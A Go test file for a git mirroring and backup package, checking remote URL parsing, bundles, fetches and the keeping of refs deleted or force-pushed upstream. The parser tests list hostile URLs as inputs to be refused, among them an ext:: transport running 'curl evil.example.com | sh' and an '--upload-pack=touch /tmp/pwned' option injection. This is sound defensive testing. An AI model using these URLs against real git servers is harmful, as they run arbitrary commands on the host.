package git

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// The tests drive the real git rather than a fake one, against repositories
// made in a temp directory. There is no point pretending: everything this
// package does is a claim about how git behaves — that a bundle of a mirror
// carries the tags, that a mirror restored from a bundle can fetch the
// difference — and a fake would only ever confirm what this file already
// believes.
//
// Nothing here touches the network. The local repositories are reached by path,
// which ParseRemote deliberately refuses; the tests build the Remote directly,
// which they can do because they are in this package and nothing outside it is.

func gitOrSkip(t *testing.T) {
	t.Helper()
	if !Available() {
		t.Skip("no git on this machine")
	}
}

// runIn is git for the tests' own setup, without the hardening this package
// applies to its own calls — the tests are making repositories, not fetching
// somebody else's.
func runIn(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(),
		"GIT_AUTHOR_NAME=T", "GIT_AUTHOR_EMAIL=t@example.com",
		"GIT_COMMITTER_NAME=T", "GIT_COMMITTER_EMAIL=t@example.com",
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %s: %v\n%s", strings.Join(args, " "), err, out)
	}
	return string(out)
}

// upstream builds a bare repository with two branches and a tag, and returns
// the path to it.
func upstream(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	bare := filepath.Join(root, "origin.git")
	runIn(t, root, "init", "--quiet", "--bare", bare)

	work := filepath.Join(root, "work")
	runIn(t, root, "clone", "--quiet", bare, work)
	if err := os.WriteFile(filepath.Join(work, "one.txt"), []byte("one\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	runIn(t, work, "add", ".")
	runIn(t, work, "commit", "--quiet", "-m", "one")
	runIn(t, work, "tag", "v1")
	runIn(t, work, "checkout", "--quiet", "-b", "side")
	if err := os.WriteFile(filepath.Join(work, "two.txt"), []byte("two\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	runIn(t, work, "add", ".")
	runIn(t, work, "commit", "--quiet", "-m", "two")
	runIn(t, work, "push", "--quiet", "origin", "--all")
	runIn(t, work, "push", "--quiet", "origin", "--tags")
	return bare
}

// commitTo adds one commit to the default branch of a bare repository, the way
// an upstream moving on looks from here.
func commitTo(t *testing.T, bare, name string) {
	t.Helper()
	root := t.TempDir()
	work := filepath.Join(root, "w")
	runIn(t, root, "clone", "--quiet", bare, work)
	if err := os.WriteFile(filepath.Join(work, name), []byte(name), 0o600); err != nil {
		t.Fatal(err)
	}
	runIn(t, work, "add", ".")
	runIn(t, work, "commit", "--quiet", "-m", name)
	runIn(t, work, "push", "--quiet", "origin", "HEAD")
}

func TestParseRemoteAcceptsTheFourTransports(t *testing.T) {
	for _, url := range []string{
		"https://github.com/chinmay28/sand-vault.git",
		"http://example.com/repo.git",
		"ssh://git@github.com/chinmay28/sand-vault.git",
		"git@github.com:chinmay28/sand-vault.git",
		"HTTPS://EXAMPLE.COM/repo.git",
	} {
		remote, err := ParseRemote(url)
		if err != nil {
			t.Errorf("ParseRemote(%q) = %v, want it accepted", url, err)
			continue
		}
		if remote.String() != url {
			t.Errorf("ParseRemote(%q) kept %q", url, remote.String())
		}
	}
}

// The one that matters. ext:: hands its argument to a shell, so a URL that
// reaches git is a command that runs as whoever runs the server.
func TestParseRemoteRefusesTheTransportThatRunsCommands(t *testing.T) {
	for _, url := range []string{
		`ext::sh -c "curl evil.example.com | sh"`,
		"ext::whoami",
		"transport::anything",

		// These four slipped through once. The scp-like branch below the
		// helper check accepts anything whose host holds a dot or an at sign,
		// and "a.b" is such a host — so "a.b::…" reached git, which read it as
		// the helper git-remote-a.b. No dangerous helper is spelled with a dot,
		// so it was not exploitable, but the allow-list is supposed to mean
		// "these four transports and nothing else" and it did not. The rule is
		// that a helper URL is refused whichever helper it names.
		"a.b::sh -c whoami",
		"x@y::sh -c whoami",
		"ext.::whoami",
		"git-remote-anything.co::payload",
	} {
		if _, err := ParseRemote(url); err == nil {
			t.Fatalf("ParseRemote(%q) was accepted — this reaches git's helper dispatch", url)
		}
	}

	// An IPv6 literal is full of colons and must still work in the spelling git
	// actually supports for it, which is the scheme form.
	for _, url := range []string{
		"ssh://git@[::1]/repo.git",
		"https://[2001:db8::1]/repo.git",
	} {
		if _, err := ParseRemote(url); err != nil {
			t.Errorf("ParseRemote(%q) = %v, want an IPv6 URL accepted", url, err)
		}
	}

	// And if one ever did get through, git itself is told to refuse it.
	gitOrSkip(t)
	_, err := run(t.Context(), "", "ls-remote", "--", "ext::echo hello")
	if err == nil {
		t.Fatal("git ran an ext:: transport despite protocol.ext.allow=never")
	}
	if !strings.Contains(err.Error(), "not allowed") {
		t.Errorf("refused for the wrong reason: %v", err)
	}
}

func TestParseRemoteRefusesLocalPathsAndOptions(t *testing.T) {
	for _, url := range []string{
		"",
		"   ",
		"/var/lib/secrets",
		"./repo",
		"../repo",
		"file:///etc",
		"-u/tmp/x",
		"--upload-pack=touch /tmp/pwned",
		"https://example.com/\nrepo",
		"C:\\repos\\thing",
	} {
		if _, err := ParseRemote(url); err == nil {
			t.Errorf("ParseRemote(%q) was accepted, want refused", url)
		}
	}
}

// A bundle of a mirror has to be the repository, not the checked-out branch of
// it: every branch, every tag, and a HEAD so that cloning it back gives
// somebody the default branch the project actually has.
func TestBundleCarriesEveryBranchAndTag(t *testing.T) {
	gitOrSkip(t)
	ctx := t.Context()
	bare := upstream(t)

	dir := t.TempDir()
	mirror := filepath.Join(dir, "mirror.git")
	if err := Mirror(ctx, Remote{bare}, mirror); err != nil {
		t.Fatal(err)
	}

	bundle := filepath.Join(dir, "repo.bundle")
	if err := Bundle(ctx, mirror, bundle); err != nil {
		t.Fatal(err)
	}

	// Cloning the bundle with a plain git — no SAND involved — is the property
	// worth having, so that is what the test does.
	restored := filepath.Join(dir, "restored")
	runIn(t, dir, "clone", "--quiet", bundle, restored)

	branches := runIn(t, restored, "branch", "-r")
	for _, want := range []string{"side"} {
		if !strings.Contains(branches, want) {
			t.Errorf("restored clone is missing branch %q:\n%s", want, branches)
		}
	}
	if tags := runIn(t, restored, "tag"); !strings.Contains(tags, "v1") {
		t.Errorf("restored clone is missing tag v1: %q", tags)
	}
	if head := strings.TrimSpace(runIn(t, restored, "rev-parse", "--abbrev-ref", "HEAD")); head == "HEAD" || head == "" {
		t.Errorf("restored clone has no branch checked out, got %q", head)
	}
}

// The second week has to be cheap, and this is what makes it so: the stored
// bundle becomes the local mirror, origin is pointed back at the real remote,
// and the fetch brings down only what moved.
func TestFromBundleThenFetchPicksUpWhatMoved(t *testing.T) {
	gitOrSkip(t)
	ctx := t.Context()
	bare := upstream(t)

	dir := t.TempDir()
	mirror := filepath.Join(dir, "mirror.git")
	if err := Mirror(ctx, Remote{bare}, mirror); err != nil {
		t.Fatal(err)
	}
	bundle := filepath.Join(dir, "repo.bundle")
	if err := Bundle(ctx, mirror, bundle); err != nil {
		t.Fatal(err)
	}

	before, err := Refs(ctx, mirror)
	if err != nil {
		t.Fatal(err)
	}

	commitTo(t, bare, "three.txt")

	// A week later: nothing kept but the bundle.
	restored := filepath.Join(dir, "restored.git")
	if err := FromBundle(ctx, bundle, restored, Remote{bare}); err != nil {
		t.Fatal(err)
	}
	if _, err := Fetch(ctx, restored, nil); err != nil {
		t.Fatal(err)
	}

	after, err := Refs(ctx, restored)
	if err != nil {
		t.Fatal(err)
	}
	if Same(before, after) {
		t.Fatal("the mirror did not pick up the new commit")
	}

	upstreamRefs, err := LsRemote(ctx, Remote{bare})
	if err != nil {
		t.Fatal(err)
	}
	if !Same(after, upstreamRefs) {
		t.Errorf("fetched mirror does not match upstream:\n mirror=%v\n remote=%v", after, upstreamRefs)
	}
}

// The cheap half of the schedule: what a remote is holding, without cloning it.
func TestLsRemoteSeesBranchesAndTagsWithoutCloning(t *testing.T) {
	gitOrSkip(t)
	bare := upstream(t)

	refs, err := LsRemote(t.Context(), Remote{bare})
	if err != nil {
		t.Fatal(err)
	}

	byName := map[string]string{}
	for _, r := range refs {
		byName[r.Name] = r.Hash
	}
	for _, want := range []string{"refs/heads/side", "refs/tags/v1"} {
		if byName[want] == "" {
			t.Errorf("ls-remote did not report %q, got %v", want, refs)
		}
	}
	// Two entries have to be absent, and the second is the one that keeps the
	// schedule cheap: a local repository never reports HEAD, so an advertised
	// HEAD would make every stored repository differ from its own upstream for
	// ever and turn the weekly check into a weekly full fetch.
	for name := range byName {
		if strings.HasSuffix(name, "^{}") {
			t.Errorf("peeled ref %q should have been dropped", name)
		}
	}
	if _, ok := byName["HEAD"]; ok {
		t.Error("HEAD should have been dropped: show-ref never reports it, so keeping it " +
			"would make a stored repository differ from upstream on every check")
	}
}

func TestSameIgnoresOrder(t *testing.T) {
	a := []Ref{{Name: "refs/heads/main", Hash: "aa"}, {Name: "refs/tags/v1", Hash: "bb"}}
	b := []Ref{{Name: "refs/tags/v1", Hash: "bb"}, {Name: "refs/heads/main", Hash: "aa"}}
	if !Same(a, b) {
		t.Error("the same refs in a different order should compare equal")
	}
	if Same(a, []Ref{{Name: "refs/heads/main", Hash: "cc"}, {Name: "refs/tags/v1", Hash: "bb"}}) {
		t.Error("a moved branch should not compare equal")
	}
	if Same(a, a[:1]) {
		t.Error("a dropped ref should not compare equal")
	}
	if !Same(nil, nil) {
		t.Error("two empty repositories should compare equal")
	}
}

// An empty repository is a real thing to be pointed at, and show-ref reports it
// by exiting non-zero with nothing to say. That is an answer, not a failure.
func TestRefsOnAnEmptyRepository(t *testing.T) {
	gitOrSkip(t)
	dir := t.TempDir()
	bare := filepath.Join(dir, "empty.git")
	runIn(t, dir, "init", "--quiet", "--bare", bare)

	refs, err := Refs(t.Context(), bare)
	if err != nil {
		t.Fatalf("Refs on an empty repository: %v", err)
	}
	if len(refs) != 0 {
		t.Errorf("expected no refs, got %v", refs)
	}
}

// A directory left behind by an interrupted run has to be told from a mirror,
// so that it can be thrown away rather than fetched into.
func TestOperationsRefuseADirectoryThatIsNotARepository(t *testing.T) {
	gitOrSkip(t)
	dir := t.TempDir()
	ctx := t.Context()

	if _, err := Fetch(ctx, dir, nil); err == nil {
		t.Error("Fetch accepted a directory with no repository in it")
	}
	if _, err := Refs(ctx, dir); err == nil {
		t.Error("Refs accepted a directory with no repository in it")
	}
	if err := Bundle(ctx, dir, filepath.Join(dir, "out.bundle")); err == nil {
		t.Error("Bundle accepted a directory with no repository in it")
	}
}

// A bundle is verified the moment it is written, because that is the last point
// at which making it again is cheap — before it is encrypted, cut into parts
// and spread over several clouds.
func TestVerifyRejectsRubbish(t *testing.T) {
	gitOrSkip(t)
	dir := t.TempDir()
	bad := filepath.Join(dir, "not.bundle")
	if err := os.WriteFile(bad, []byte("this is not a bundle"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := Verify(t.Context(), bad); err == nil {
		t.Fatal("Verify accepted a file that is not a bundle")
	}
}

// A cancelled sweep has to stop, and say that is why it stopped.
func TestRunHonoursACancelledContext(t *testing.T) {
	gitOrSkip(t)
	ctx, cancel := context.WithCancel(t.Context())
	cancel()

	if _, err := Version(ctx); err == nil {
		t.Fatal("a cancelled context still ran git")
	}
}

// pushTo runs a push against a bare repository from a fresh clone of it, with
// whatever refspecs the test wants: a deletion, a forced update, a new branch.
func pushTo(t *testing.T, bare string, refspecs ...string) {
	t.Helper()
	root := t.TempDir()
	work := filepath.Join(root, "w")
	runIn(t, root, "clone", "--quiet", bare, work)
	runIn(t, work, append([]string{"push", "--quiet", "origin"}, refspecs...)...)
}

// mirrorOf is a mirror of a bare repository, the way a refresh starts.
func mirrorOf(t *testing.T, bare string) string {
	t.Helper()
	dir := filepath.Join(t.TempDir(), "mirror.git")
	if err := Mirror(t.Context(), Remote{bare}, dir); err != nil {
		t.Fatal(err)
	}
	return dir
}

// names is the ref names in a list, for a test to look through.
func names(refs []Ref) []string {
	out := make([]string, 0, len(refs))
	for _, r := range refs {
		out = append(out, r.Name)
	}
	return out
}

func hasPrefix(list []string, prefix string) bool {
	for _, s := range list {
		if strings.HasPrefix(s, prefix) {
			return true
		}
	}
	return false
}

// The contract that makes a mirror a backup rather than a copy: a branch and
// a tag deleted upstream are still in the bundle afterwards, and the mirror
// still matches the upstream ref for ref so the next check stays cheap.
func TestFetchKeepsWhatUpstreamDeleted(t *testing.T) {
	gitOrSkip(t)
	ctx := t.Context()
	bare := upstream(t)
	mirror := mirrorOf(t, bare)

	pushTo(t, bare, ":refs/heads/side", ":refs/tags/v1")

	kept, err := Fetch(ctx, mirror, nil)
	if err != nil {
		t.Fatal(err)
	}
	got := names(kept)
	if !hasPrefix(got, KeptPrefix+"heads/side@") || !hasPrefix(got, KeptPrefix+"tags/v1@") {
		t.Fatalf("kept = %v, want the deleted branch and tag held under %s", got, KeptPrefix)
	}

	// Ref for ref the mirror is the upstream, which is what keeps the schedule
	// cheap: Refs does not report what is kept, and LsRemote would not either.
	refs, err := Refs(ctx, mirror)
	if err != nil {
		t.Fatal(err)
	}
	advertised, err := LsRemote(ctx, Remote{bare})
	if err != nil {
		t.Fatal(err)
	}
	if !Same(refs, advertised) {
		t.Errorf("after the fetch the mirror does not match upstream:\n mirror=%v\n remote=%v", refs, advertised)
	}
	held, err := Kept(ctx, mirror)
	if err != nil {
		t.Fatal(err)
	}
	if len(held) != 2 {
		t.Errorf("Kept = %v, want the two refs", held)
	}

	// And it survives the round trip through a bundle: the commit the deleted
	// branch reached is in the bundle, a plain clone can fetch it by name, and
	// a mirror made from the bundle still holds it.
	dir := t.TempDir()
	bundle := filepath.Join(dir, "repo.bundle")
	if err := Bundle(ctx, mirror, bundle); err != nil {
		t.Fatal(err)
	}
	restored := filepath.Join(dir, "restored")
	runIn(t, dir, "clone", "--quiet", bundle, restored)
	if branches := runIn(t, restored, "branch", "-r"); strings.Contains(branches, "side") {
		t.Errorf("a plain clone of the bundle shows the deleted branch as a branch:\n%s", branches)
	}
	runIn(t, restored, "fetch", "--quiet", "origin", KeptPrefix+"*:"+KeptPrefix+"*")
	if log := runIn(t, restored, "log", "--oneline", got[0]); !strings.Contains(log, "two") {
		t.Errorf("the kept branch does not reach its commit: %q", log)
	}

	again := filepath.Join(dir, "again.git")
	if err := FromBundle(ctx, bundle, again, Remote{bare}); err != nil {
		t.Fatal(err)
	}
	if held, _ := Kept(ctx, again); len(held) != 2 {
		t.Errorf("a mirror made from the bundle holds %v, want the two kept refs", held)
	}
}

// The usual way a branch disappears is by being merged, and that is not worth
// keeping: nothing it reaches is lost. Keeping every one of those would make
// the copy a museum of every branch the project ever had.
func TestFetchLetsAMergedBranchGo(t *testing.T) {
	gitOrSkip(t)
	ctx := t.Context()
	bare := upstream(t)
	mirror := mirrorOf(t, bare)

	root := t.TempDir()
	work := filepath.Join(root, "w")
	runIn(t, root, "clone", "--quiet", bare, work)
	runIn(t, work, "merge", "--quiet", "--no-edit", "origin/side")
	runIn(t, work, "push", "--quiet", "origin", "HEAD", ":refs/heads/side")

	kept, err := Fetch(ctx, mirror, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(kept) != 0 {
		t.Errorf("kept %v for a branch whose commits are all on the default branch", names(kept))
	}
	if held, _ := Kept(ctx, mirror); len(held) != 0 {
		t.Errorf("Kept = %v, want nothing", held)
	}
	if refs, _ := Refs(ctx, mirror); hasPrefix(names(refs), "refs/heads/side") {
		t.Error("the merged branch is still reported as a branch the upstream has")
	}
}

// A force-push replaces a branch's history, and the history it replaced is the
// one the backup exists for. (Rewriting side rather than the default branch:
// the default branch's old tip is still reached by the tag and by side, and a
// tip something else reaches is nothing lost.)
func TestFetchKeepsTheHistoryAForcePushRewrote(t *testing.T) {
	gitOrSkip(t)
	ctx := t.Context()
	bare := upstream(t)
	mirror := mirrorOf(t, bare)
	before, _ := CountCommits(ctx, mirror)

	root := t.TempDir()
	work := filepath.Join(root, "w")
	runIn(t, root, "clone", "--quiet", bare, work)
	runIn(t, work, "checkout", "--quiet", "side")
	runIn(t, work, "commit", "--quiet", "--amend", "-m", "two, rewritten")
	runIn(t, work, "push", "--quiet", "--force", "origin", "side")

	kept, err := Fetch(ctx, mirror, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !hasPrefix(names(kept), KeptPrefix+"heads/side@") {
		t.Fatalf("kept = %v, want the old tip of side", names(kept))
	}
	after, _ := CountCommits(ctx, mirror)
	if after != before+1 {
		t.Errorf("the mirror reaches %d commits, want the %d it had plus the rewritten one", after, before)
	}

	// The old tip is in the bundle and the new one is the branch.
	bundle := filepath.Join(t.TempDir(), "repo.bundle")
	if err := Bundle(ctx, mirror, bundle); err != nil {
		t.Fatal(err)
	}
	heads := runIn(t, filepath.Dir(bundle), "bundle", "list-heads", bundle)
	if !strings.Contains(heads, KeptPrefix+"heads/side@") || !strings.Contains(heads, "refs/heads/side\n") {
		t.Errorf("the bundle does not carry both the kept tip and the branch:\n%s", heads)
	}
}

// A branch renamed into a folder of the same name — foo becoming foo/bar —
// cannot be fetched while a ref called foo is in the way, which is why what the
// upstream dropped is moved aside before the fetch and not after.
func TestFetchSurvivesABranchRenamedIntoAFolder(t *testing.T) {
	gitOrSkip(t)
	ctx := t.Context()
	bare := upstream(t)
	mirror := mirrorOf(t, bare)

	pushTo(t, bare, "refs/remotes/origin/side:refs/heads/side/sub", ":refs/heads/side")

	if _, err := Fetch(ctx, mirror, nil); err != nil {
		t.Fatalf("Fetch: %v", err)
	}
	refs, _ := Refs(ctx, mirror)
	if !hasPrefix(names(refs), "refs/heads/side/sub") || hasPrefix(names(refs), "refs/heads/side@") {
		t.Errorf("refs = %v, want side/sub and no side", names(refs))
	}
	// Same commit, new name: nothing was lost, so nothing is kept.
	if held, _ := Kept(ctx, mirror); len(held) != 0 {
		t.Errorf("Kept = %v, want nothing for a branch that only moved", held)
	}
}

// A branch deleted, made again with more on it, and deleted again holds one
// entry and not a trail: the later tip reaches the earlier one.
func TestFetchReplacesAKeptRefTheNextOneSupersedes(t *testing.T) {
	gitOrSkip(t)
	ctx := t.Context()
	bare := upstream(t)
	mirror := mirrorOf(t, bare)

	pushTo(t, bare, ":refs/heads/side")
	if _, err := Fetch(ctx, mirror, nil); err != nil {
		t.Fatal(err)
	}
	first, _ := Kept(ctx, mirror)
	if len(first) != 1 {
		t.Fatalf("Kept = %v, want the deleted branch", first)
	}

	// Back, with one more commit, then gone again.
	root := t.TempDir()
	work := filepath.Join(root, "w")
	runIn(t, root, "clone", "--quiet", bare, work)
	runIn(t, work, "checkout", "--quiet", "-b", "side", first[0].Hash)
	if err := os.WriteFile(filepath.Join(work, "three.txt"), []byte("three\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	runIn(t, work, "add", ".")
	runIn(t, work, "commit", "--quiet", "-m", "three")
	runIn(t, work, "push", "--quiet", "origin", "side")
	if _, err := Fetch(ctx, mirror, nil); err != nil {
		t.Fatal(err)
	}
	pushTo(t, bare, ":refs/heads/side")
	if _, err := Fetch(ctx, mirror, nil); err != nil {
		t.Fatal(err)
	}

	held, _ := Kept(ctx, mirror)
	if len(held) != 1 || held[0].Name == first[0].Name {
		t.Errorf("Kept = %v, want one entry, for the later tip, in place of %v", held, first)
	}
	if log := runIn(t, mirror, "log", "--oneline", held[0].Name); !strings.Contains(log, "three") || !strings.Contains(log, "two") {
		t.Errorf("the kept entry does not reach both tips: %q", log)
	}
}

// Whatever the upstream advertises under refs/sand/, the fetch leaves what the
// mirror keeps for itself exactly as it was.
func TestFetchDoesNotLetUpstreamTouchWhatIsKept(t *testing.T) {
	gitOrSkip(t)
	ctx := t.Context()
	bare := upstream(t)
	mirror := mirrorOf(t, bare)

	pushTo(t, bare, ":refs/heads/side")
	kept, err := Fetch(ctx, mirror, nil)
	if err != nil || len(kept) != 1 {
		t.Fatalf("Fetch = %v, %v; want one kept ref", kept, err)
	}

	// An upstream that writes into the namespace, over the kept ref and beside
	// it.
	runIn(t, bare, "update-ref", kept[0].Name, "HEAD")
	runIn(t, bare, "update-ref", KeptPrefix+"heads/planted@000000000000", "HEAD")

	if _, err := Fetch(ctx, mirror, nil); err != nil {
		t.Fatal(err)
	}
	held, _ := Kept(ctx, mirror)
	if len(held) != 1 || held[0] != kept[0] {
		t.Errorf("Kept = %v after the fetch, want %v untouched", held, kept)
	}
	if advertised, _ := LsRemote(ctx, Remote{bare}); hasPrefix(names(advertised), ownPrefix) {
		t.Errorf("LsRemote reports the upstream's refs/sand/ entries: %v", names(advertised))
	}
}

// An upstream that has been wiped still answers, with nothing. The vault
// refuses to refresh from one (see internal/vault); should a fetch be run
// against one anyway, every ref is kept and nothing is lost.
func TestFetchFromAWipedUpstreamKeepsEverything(t *testing.T) {
	gitOrSkip(t)
	ctx := t.Context()
	bare := upstream(t)
	mirror := mirrorOf(t, bare)
	commits, _ := CountCommits(ctx, mirror)

	refs, _ := Refs(ctx, mirror)
	for _, r := range refs {
		runIn(t, bare, "update-ref", "-d", r.Name)
	}

	kept, err := Fetch(ctx, mirror, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(kept) != len(refs) {
		t.Errorf("kept %v, want all %d refs", names(kept), len(refs))
	}
	if left, _ := Refs(ctx, mirror); len(left) != 0 {
		t.Errorf("Refs = %v, want none: the upstream has none", left)
	}
	if after, _ := CountCommits(ctx, mirror); after != commits {
		t.Errorf("the mirror reaches %d commits, had %d", after, commits)
	}
	bundle := filepath.Join(t.TempDir(), "repo.bundle")
	if err := Bundle(ctx, mirror, bundle); err != nil {
		t.Errorf("a bundle of only kept refs: %v", err)
	}
}

// A default branch renamed upstream — master become main — leaves a mirror's
// HEAD naming a branch it no longer holds, and a bundle with such a HEAD clones
// with nothing checked out. The fetch follows the upstream's HEAD instead.
func TestFetchFollowsARenamedDefaultBranch(t *testing.T) {
	gitOrSkip(t)
	ctx := t.Context()
	bare := upstream(t)
	mirror := mirrorOf(t, bare)

	was, err := Head(ctx, mirror)
	if err != nil || was == "" {
		t.Fatalf("Head = %q, %v", was, err)
	}
	pushTo(t, bare, "refs/remotes/origin/"+was+":refs/heads/renamed")
	runIn(t, bare, "symbolic-ref", "HEAD", "refs/heads/renamed")
	pushTo(t, bare, ":refs/heads/"+was)

	kept, err := Fetch(ctx, mirror, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(kept) != 0 {
		t.Errorf("kept %v for a branch that only changed its name", names(kept))
	}
	if head, _ := Head(ctx, mirror); head != "renamed" {
		t.Errorf("Head = %q after the rename, want renamed", head)
	}

	dir := t.TempDir()
	bundle := filepath.Join(dir, "repo.bundle")
	if err := Bundle(ctx, mirror, bundle); err != nil {
		t.Fatal(err)
	}
	restored := filepath.Join(dir, "restored")
	runIn(t, dir, "clone", "--quiet", bundle, restored)
	if head := strings.TrimSpace(runIn(t, restored, "rev-parse", "--abbrev-ref", "HEAD")); head != "renamed" {
		t.Errorf("a clone of the bundle checked out %q, want renamed", head)
	}
}
